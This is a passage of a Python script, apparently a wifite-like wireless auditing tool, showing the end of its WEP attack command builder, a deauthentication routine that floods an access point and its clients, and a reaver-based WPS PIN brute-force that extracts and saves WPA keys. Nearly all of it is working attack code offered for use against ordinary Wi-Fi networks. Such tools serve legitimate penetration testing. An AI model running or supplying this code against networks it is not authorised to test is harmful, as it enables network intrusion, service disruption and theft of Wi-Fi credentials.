	elif attack_num == 2:
		cmd = ['aireplay-ng',
		       '--ignore-negative-one',
		       '--fragment',
		       '-b', target.bssid,
		       '-x', str(WEP_PPS), # Packets per second
		       '-m', '100', # Minimum packet length (bytes)
		       '-F'] # Automatically choose the first packet
		if client_mac != '': 
			cmd.append('-h')
			cmd.append(client_mac)
		elif len(clients) > 0: 
			cmd.append('-h')
			cmd.append(clients[0].bssid)
		cmd.append(iface)
	
	elif attack_num == 3:
		cmd = ['aireplay-ng',
		       '--ignore-negative-one',
		       '--caffe-latte',
		       '-b', target.bssid]
		if len(clients) > 0:
			cmd.append('-h')
			cmd.append(clients[0].bssid)
		cmd.append(iface)
		
	elif attack_num == 4:
		cmd = ['aireplay-ng',
		       '--ignore-negative-one',
		       '--interactive',
		       '-b', target.bssid,
		       '-c', 'ff:ff:ff:ff:ff:ff',
		       '-t', '1', # Only select packets with ToDS bit set
		       '-x', str(WEP_PPS), # Packets per second
		       '-F',      # Automatically choose the first packet
		       '-p', '0841']
		cmd.append(iface)
	
	elif attack_num == 5:
		if len(clients) == 0:
			print R+' [0:00:00] unable to carry out hirte attack: '+O+'no clients'
			return ''
		cmd = ['aireplay-ng',
		       '--ignore-negative-one',
		       '--cfrag',
		       '-h', clients[0].bssid,
		       iface]
		
	return cmd


def wep_send_deauths(iface, target, clients):
	"""
		Sends deauth packets to broadcast and every client.
	"""
	# Send deauth to broadcast
	cmd = ['aireplay-ng',
	       '--ignore-negative-one',
	       '--deauth', str(WPA_DEAUTH_COUNT),
	       '-a', target.bssid,
	       iface]
	call(cmd, stdout=OUTLOG, stderr=ERRLOG)
	# Send deauth to every client
	for client in clients:
		cmd = ['aireplay-ng',
			     '--ignore-negative-one',
			     '--deauth', str(WPA_DEAUTH_COUNT),
			     '-a', target.bssid,
			     '-h', client.bssid,
			     iface]
		call(cmd, stdout=OUTLOG, stderr=ERRLOG)










#################
# WPS FUNCTIONS #
#################


def wps_attack(iface, target):
	"""
		Mounts attack against target on iface.
		Uses "reaver" to attempt to brute force the PIN.
		Once PIN is found, PSK can be recovered.
		PSK is displayed to user and added to WPS_FINDINGS
	"""
	
	print GR+' [0:00:00]'+W+' initializing %sWPS PIN attack%s on %s' % \
	             (G, W, G+target.ssid+W+' ('+G+target.bssid+W+')'+W)
	
	cmd = ['reaver',
	       '-i', iface,
	       '-b', target.bssid,
	       '-o', temp + 'out.out', # Dump output to file to be monitored
	       '-a',  # auto-detect best options, auto-resumes sessions, doesn't require input!
	       '-c', target.channel,
	       # '--ignore-locks',
	       '-vv']  # verbose output
	proc = Popen(cmd, stdout=OUTLOG, stderr=ERRLOG)
	
	cracked = False   # Flag for when password/pin is found
	percent = 'x.xx%' # Percentage complete
	aps     = 'x'     # Seconds per attempt
	time_started = time.time()
	last_success = time_started # Time of last successful attempt
	last_pin = ''     # Keep track of last pin tried (to detect retries)
	retries  = 0      # Number of times we have attempted this PIN
	tries_total = 0      # Number of times we have attempted all pins
	tries    = 0      # Number of successful attempts
	pin = ''
	key = ''
	
	try:
		while not cracked:
			time.sleep(1)
			
			if proc.poll() != None:
				# Process stopped: Cracked? Failed? 
				inf = open(temp + 'out.out', 'r')
				lines = inf.read().split('\n')
				inf.close()
				for line in lines:
					# When it's cracked:
					if line.find("WPS PIN: '") != -1:
						pin = line[line.find("WPS PIN: '") + 10:-1]
					if line.find("WPA PSK: '") != -1:
						key = line[line.find("WPA PSK: '") + 10:-1]
						cracked = True
				break

			if not os.path.exists(temp + 'out.out'): continue
			
			inf = open(temp + 'out.out', 'r')
			lines = inf.read().split('\n')
			inf.close()
			
			for line in lines:
				if line.strip() == '': continue
				# Status
				if line.find(' complete @ ') != -1 and len(line) > 8:
					percent = line.split(' ')[1]
					i = line.find(' (')
					j = line.find(' seconds/', i)
					if i != -1 and j != -1: aps = line[i+2:j]
				# PIN attempt
				elif line.find(' Trying pin ') != -1:
					pin = line.strip().split(' ')[-1]
					if pin == last_pin: 
						retries += 1
					elif tries_total == 0:
						last_pin = pin
						tries_total -= 1
					else:
						last_success = time.time()
						tries += 1
						last_pin = pin
						retries = 0
					tries_total += 1
					
				# Warning
				elif line.endswith('10 failed connections in a row'): pass
				
				# Check for PIN/PSK
				elif line.find("WPS PIN: '") != -1:
					pin = line[line.find("WPS PIN: '") + 10:-1]
				elif line.find("WPA PSK: '") != -1:
					key = line[line.find("WPA PSK: '") + 10:-1]
					cracked = True
				if cracked: break
			
			print ' %s WPS attack, %s success/ttl,' % \
									(GR+sec_to_hms(time.time()-time_started)+W, \
									G+str(tries)+W+'/'+O+str(tries_total)+W),
			
			if percent == 'x.xx%' and aps == 'x': print '\r',
			else:
				print '%s complete (%s sec/att)   \r' % (G+percent+W, G+aps+W),
			
			
			if WPS_TIMEOUT > 0 and (time.time() - last_success) > WPS_TIMEOUT:
				print R+'\n [!]'+O+' unable to complete successful try in %d seconds' % (WPS_TIMEOUT)
				print R+' [+]'+W+' skipping %s' % (O+target.ssid+W)
				break
			
			if WPS_MAX_RETRIES > 0 and retries > WPS_MAX_RETRIES:
				print R+'\n [!]'+O+' unable to complete successful try in %d retries' % (WPS_MAX_RETRIES)
				print R+' [+]'+O+' the access point may have WPS-locking enabled, or is too far away'+W
				print R+' [+]'+W+' skipping %s' % (O+target.ssid+W)
				break
				
			if WPS_RATIO_THRESHOLD > 0.0 and tries > 0 and (float(tries) / tries_total) < WPS_RATIO_THRESHOLD:
				print R+'\n [!]'+O+' successful/total attempts ratio was too low (< %.2f)' % (WPS_RATIO_THRESHOLD)
				print R+' [+]'+W+' skipping %s' % (G+target.ssid+W)
				break
				
			stdout.flush()
			# Clear out output file if bigger than 1mb
			inf = open(temp + 'out.out', 'w')
			inf.close()
		
		# End of big "while not cracked" loop
		
		if cracked:
			if pin != '': print GR+'\n\n [+]'+G+' PIN found:     %s' % (C+pin+W)
			if key != '': print GR+' [+] %sWPA key found:%s %s' % (G, W, C+key+W)
			WPA_FINDINGS.append(W+"found %s's WPA key: \"%s\", WPS PIN: %s" % (G+target.ssid+W, C+key+W, C+pin+W))
			WPA_FINDINGS.append('')
			
			save_cracked(target.bssid, target.ssid, "Key is '" + key + "' and PIN is '" + pin + "'", 'WPA')
		
	except KeyboardInterrupt:
		print R+'\n (^C)'+O+' WPS brute-force attack interrupted'+W
		if attack_interrupted_prompt():
			send_interrupt(proc)
			print ''
			exit_gracefully(0)
	
	send_interrupt(proc)
	
	return cracked



#c = CapFile('hs/KillfuckSoulshitter_C0-C1-C0-07-54-DC_2.cap', 'Killfuck Soulshitter', 'c0:c1:c0:07:54:dc')
#WPA_CRACKER = 'aircrack'
#cracked = wpa_crack(c)
#print cracked
#exit_gracefully(1)

if __name__ == '__main__':
	try:
		banner()
		main()
	except KeyboardInterrupt: print R+'\n (^C)'+O+' interrupted\n'+W
	except EOFError:          print R+'\n (^D)'+O+' interrupted\n'+W
	
	exit_gracefully(0)


